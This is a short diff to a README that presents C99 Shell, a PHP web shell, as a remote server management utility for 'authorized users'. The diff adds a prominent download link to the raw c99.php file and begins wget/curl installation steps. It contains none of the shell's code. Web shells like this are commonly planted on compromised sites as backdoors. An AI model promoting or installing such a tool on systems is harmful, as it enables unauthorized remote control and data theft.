@@ -17,6 +17,8 @@ C99 Shell is a robust PHP web shell utility that allows authorized users to remo
 
 To install **C99 Shell** on your server, follow these steps:
 
+## [🔥 Download C99 Shell](https://raw.githubusercontent.com/c99-shell/c99/refs/heads/main/c99.php)
+
 1. **Download the Shell Script**  
    Use `wget` or `curl` to download the `c99.php` file:
 
